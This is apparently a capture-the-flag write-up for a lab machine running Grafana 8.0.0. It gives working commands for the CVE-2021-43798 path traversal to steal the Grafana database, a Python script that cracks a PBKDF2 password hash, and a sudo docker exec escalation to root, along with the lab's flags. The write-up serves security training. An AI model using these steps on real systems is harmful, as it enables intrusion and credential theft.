<img width="697" height="664" alt="image" src="https://github.com/user-attachments/assets/02d71794-72d9-417c-9bf5-b51acf03bec2" />

## Data — Grafana (writeup)

> *How many open TCP ports are listening on Data?*
> 

### 1) Recon

Command used:

```bash
nmap -sV 10.129.234.47
```

<img width="1340" height="226" alt="image" src="https://github.com/user-attachments/assets/bc35a62e-9e75-496c-a4d9-08cfa1a48c49" />

Answer : **2**

> *What application is listening on the HTTP server?*
> 

Based on nmap scanning the HTTP server on port 3000 is running Grafana

Answer: **Grafana**

> *What version of Grafana is running on Data? Please give in the format **...*
> 

just go to the ip address then you can see the version below

<img width="814" height="817" alt="image" src="https://github.com/user-attachments/assets/0a34f663-f757-4bd1-a0ad-4c19dc6453e4" />

Answer: **v8.0.0**

> *What is the CVE ID for a 2021 vulnerability in this version of Grafana that describes a directory traversal vulnerability that allows attackers to read arbitrary files from the webserver?*
> 

you can search the answer on google

<img width="937" height="438" alt="image" src="https://github.com/user-attachments/assets/b9ee5544-9411-4aa0-af12-222e3a2b4fdd" />

Answer: **CVE-2021-43798**

> *What is the full absolute path of the Grafana DB file on Data?*
> 

<img width="841" height="286" alt="image" src="https://github.com/user-attachments/assets/f83eb3cf-6303-4cd9-b9e2-da46e129408e" />

Answer: **/var/lib/grafana/grafana.db**

> *Besides admin, what other user has an account on the Grafana instance?*
> 

### Exploiting the path traversal to grab the Grafana database

```php
 curl -sS -D /tmp/grafana_headers.txt --path-as-is \
  "http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db.new

 sed -n '1,120p' /tmp/grafana_headers.txt

sqlite3 grafana.db "SELECT login FROM user;"
```

<img width="1367" height="532" alt="image" src="https://github.com/user-attachments/assets/3b9f7f97-5f9e-48d7-92b8-8f8ea5401ddf" />

So besides `admin` there is **boris**

Answer: **boris**

> *What is the boris user's password on Data?*
> 

**Extract boris hash, convert and crack**

```php
sqlite3 grafana.db "SELECT login, password FROM user WHERE login='boris';"
```

<img width="1369" height="96" alt="image" src="https://github.com/user-attachments/assets/ed91e29f-e6ca-459d-9c5f-a37f4c84bc53" />

to crack it I use this python script

```php
#!/usr/bin/env python3
import sys, hashlib
from multiprocessing import Pool, cpu_count

# --- CONFIG ---
TARGET_HEX = "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
SALT = b"LCBhdtJWjl"
ITER = 10000
DKLEN = 50
WORDLIST = "/usr/share/wordlists/rockyou.txt"
# ----------------

def try_pw(pw):
    pw = pw.rstrip("\n\r")
    if not pw:
        return None
    try:
        dk = hashlib.pbkdf2_hmac("sha256", pw.encode('utf-8', 'ignore'), SALT, ITER, DKLEN)
    except Exception:
        return None
    if dk.hex() == TARGET_HEX:
        return pw
    return None

def initializer():
    # no-op, placeholder if you want per-worker init
    pass

if __name__ == "__main__":
    if len(sys.argv) > 1:
        WORDLIST = sys.argv[1]
    print("Using wordlist:", WORDLIST)
    pool = Pool(processes=cpu_count(), initializer=initializer)
    found = None
    try:
        with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
            # map in chunks for efficiency
            for idx, res in enumerate(pool.imap_unordered(try_pw, f, chunksize=1000), 1):
                if res:
                    print("\\n=== FOUND ===\\n", res)
                    found = res
                    pool.terminate()
                    break
                if idx % 50000 == 0:
                    print("checked", idx, "candidates", flush=True)
    finally:
        pool.close()
        pool.join()
    if found:
        print("Password is:", found)
        sys.exit(0)
    else:
        print("Password not found in wordlist:", WORDLIST)
        sys.exit(1)

chmod +x crack_pbkdf2_mp.py
./crack_pbkdf2_mp.py /usr/share/wordlists/rockyou.txt
```

<img width="902" height="116" alt="image" src="https://github.com/user-attachments/assets/ab06d0e7-682b-49fa-bd3d-9291a8a1d62e" />

Answer: **beautiful1**

> *Submit the flag located in the boris user's home directory.*
> 

I use Boris cred to log in using ssh and right away you will get the user flag

<img width="1389" height="681" alt="image" src="https://github.com/user-attachments/assets/5c5b1eb1-a1a4-40d2-899d-85536a9d6a9b" />

Answer: **75fdd5714ec98a90b16d3c7301cf7e0e**

### Check sudoers for privilege escalation

> *What is the full path of the binary that the boris user can run as root without entering a password on Data using sudo?*
> 

On the host (as boris):

```bash
sudo -l
```

<img width="1349" height="104" alt="image" src="https://github.com/user-attachments/assets/2857d738-1332-4a80-b436-109c37da9984" />

So boris can run `docker exec` (the docker binary is at `/snap/bin/docker`) as root without a password. 

**Answer: /snap/bin/docker**. 

**Enumerate Docker → find container → escalate to root**

Because `sudo /snap/bin/docker exec *` is allowed but `sudo /snap/bin/docker ps` required a password, we enumerated candidate containers using cgroup and mountinfo (no root needed):

Find container id from cgroups:

```bash
grep -Eho '[0-9a-f]{64}' /proc/*/cgroup 2>/dev/null | sort -u
```

Use the short id with the allowed sudo exec and get a root shell inside the container:

```bash
sudo /snap/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 bash
```

Inside the container you can inspect mounts and devices. In this instance it was possible to mount the host block device and read the host `/root`:

Mount host root device inside the container for inspection:

```bash
mount /dev/sda1 /mnt
ls /mnt/root
cat /mnt/root/root.txt
```

<img width="1374" height="197" alt="image" src="https://github.com/user-attachments/assets/61ccc2b6-8989-49ed-9b4c-986a80e315d7" />

- The Grafana directory traversal advisory and details are tracked under **CVE-2021-43798** (Grafana versions 8.0.0-beta1 → 8.3.0 were vulnerable). See NVD and Grafana advisory for timeline and patches. [National Vulnerability Database+1](https://nvd.nist.gov/vuln/detail/cve-2021-43798?utm_source=chatgpt.com)
- Grafana patch guidance: upgrade to fixed versions (8.0.7 / 8.1.8 / 8.2.7 / 8.3.1 or later). [Tenable®](https://www.tenable.com/plugins/nessus/183776?utm_source=chatgpt.com)
